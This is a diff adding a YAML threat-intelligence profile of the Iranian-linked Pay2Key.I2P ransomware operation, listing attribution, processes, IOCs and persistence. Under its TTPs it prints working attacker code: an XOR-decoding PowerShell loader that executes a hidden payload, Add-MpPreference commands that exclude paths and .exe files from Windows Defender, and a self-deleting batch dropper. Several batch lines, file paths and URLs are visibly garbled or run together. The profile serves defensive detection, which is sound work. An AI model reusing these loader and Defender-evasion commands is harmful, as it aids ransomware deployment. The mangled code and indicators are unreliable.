@@ -1,0 +1,115 @@
+description: Pay2Key.I2P is a resurgent Iranian-backed ransomware-as-a-service (RaaS)
+  operation targeting Western organizations. Linked to the Fox Kitten APT group, it
+  offers an 80% profit share for affiliates supporting Iran.
+attribution:
+- threat_actor: Pay2Key
+- apt_group: Fox Kitten
+- country: Iran
+malware_families:
+- Mimic Ransomware
+- Pay2Key
+TTPs:
+  processes:
+  - setup.cmd
+  - setup.ps1
+  - powrprof.exe
+  - wsc_proxy.exe
+  - Everything.exe
+  - enc-build.exe
+  - powershell.exe
+  - 7za.exe
+  commandline:
+  - powershell -NoP -NonI -W Hidden -Exec Bypass $decode = { ... }; & $decode
+  - powershell -NoP -NonI -W Hidden -Exec Bypass $decode = { ... }; & $decode
+  - setup.cmd
+  - powershell -nop -c iex ([io.file]::ReadAllText($env:0))
+  - 7za x -y -p%psw% o\"%out%\" data2.bin
+  - start \".\" /wait \"enc-build.exe\"
+  powershell:
+  - $decode = { ... }; & $decode
+  - Add-MpPreference -ExclusionPath "C:\\Windows\\System32"
+  - Start-Process "powrprof.exe"
+  - Start-Sleep -Seconds 10; Remove-Item "$scriptPath" -Force
+  - "function encode($data, [int]$key) {\n  $step = ($key % 10) + 1\n  return $data\
+    \ | ForEach-Object {\n    $key = ($key % 255) + 1\n    $_ -bxor $key\n    $key\
+    \ += $step\n  }\n}\n$binaryData = [System.IO.File]::ReadAllBytes(\\\"data.bin\\\
+    \")\n$encodedData = encode -data $binaryData -key 21101\n& ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString($encodedData)))\n"
+  - "function encode($data, [int]$key) {\n  $step = ($key % 10) + 1\n  return $data\
+    \ | ForEach-Object {\n    $key = ($key % 255) + 1\n    $_ -bxor $key\n    $key\
+    \ += $step\n  }\n}\n$binaryData = [System.IO.File]::ReadAllBytes(\\\"datal.bin\\\
+    \")\n$encodedData = encode -data $binaryData -key 21101\n[System.IO.File]::WriteAllBytes(\\\
+    \"7za.exe\\\", $encodedData)\n"
+  - powershell -nop -c iex ([io.file]::ReadAllText($env:0))
+  - Add-MpPreference -Force -ExclusionExtension 'exe'
+  scripting_engine:
+  - setup.cmd
+  - setup.ps1
+  - '@echo off
+
+    set \"0=%~f0\"
+
+    set 1=%*
+
+    cd/d \"%~dpo\"
+
+    powershell -nop -c iex ([io.file]::ReadAllText($env:0))
+
+    del /f data.bin datal.binset psw=21101
+
+    set out=%SystemDrive%\\Program Files\\Avset out=%out%ast Software\\Avset out=%out%ast7za
+    x -y -p%psw% o\"%out%\" data2.bindel /f data2.binpushd \"%out%\"&echo (|powrprof|find
+    \"done\"||echo(|powrprof&popd7za x -y -p%psw% data3.bindel /f data3.binstart \".\"
+    /wait \"enc-build.exe\"timeout /t 10del /f \"%~0\"exit/b
+
+    '
+  - 'reg query HKEY_USERS\\S-1-5-19 || exitif exist data4.bin (call :h data4.bin7za
+    x -y -p%psw% data4.bindel /f data4.bin%ps% -nop -c \"iex (Get-Content -Path .\\task.psl
+    | Out-String)\"del .\\task.psl$taskDefinition = $scheduler.NewTask(0)$taskDefinition.RegistrationInfo.Description
+    = \"Shell\"$taskDefinition.RegistrationInfo.Name = $taskName$triggerTime = ConvertFrom-UnixTime
+    -UnixTime $triggerUnixTimestart \".\" /wait \"enc-build.exe\"if (Test-Path \"data5.bin\"
+    -PathType Leaf{$binaryData = [System.IO.File]::ReadAllBytes(\"data5.bin\")$encodedData
+    = encode -data $binaryData -key 10775Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($encodedData))$binaryData
+    = [System.IO.File]::ReadAllBytes(\"data.bin\")$encodedData = encode -data $binaryData
+    -key 10775& ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString($encodedData)))Start-Sleep
+    -Seconds 3
+
+    '
+  registry_keys:
+  - HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
+  - HKEY_USERS\\S-1-5-19
+  image_load: []
+  network_connections:
+  - process: enc-build.exe
+    destination: pay2key.i2p
+    port: 443
+  - https://client.pay2key.com/2user_id=ID_PLACEHOLDER
+  - http://pay2key I, 2/ >user_id=1D_PLACEHOLDER
+  - https://github.com/PurpleI2P/i2pdbrouser/releases/tag/latest
+  file_activity:
+  - '%SystemDrive%\\Program Files\\Avast Software\\Avast\\powrprof.exe'
+  - '%SystemDrive%\\Program Files\\Avast Software\\Avast\\wsc_proxy.exe'
+  - '%LOCALAPPDATA%\\<GUID>\\browser.exe'
+  - '%SystemDrive%\\Program Files\\Avset out%ast Software\\Avset out%ast7za.exe'
+  - data.bin
+  - datal.bin
+  - data2.bin
+  - data3.bin
+  - data4.bin
+  - data5.bin
+  persistence:
+  - Scheduled Task for postponed execution of ransomware
+  - Task Scheduler
+  pipes: []
+  process_relations:
+  - setup.cmd -> powrprof.exe
+  - setup.ps1 -> enc-build.exe
+  - powershell.exe -> enc-build.exe
+IOCs:
+- https://client.pay2key.com/2user_id=ID_PLACEHOLDER
+- http://pay2key I, 2/ >user_id=1D_PLACEHOLDER
+- https://github.com/PurpleI2P/i2pdbrouser/releases/tag/latest
+authors:
+- Ilia Kulmin
+reference: https://www.morphisec.com/blog/pay2key-resurgence-iranian-cyber-warfare/
+date_of_publication: July 08, 2025
+file_creation_date: July 28, 2025
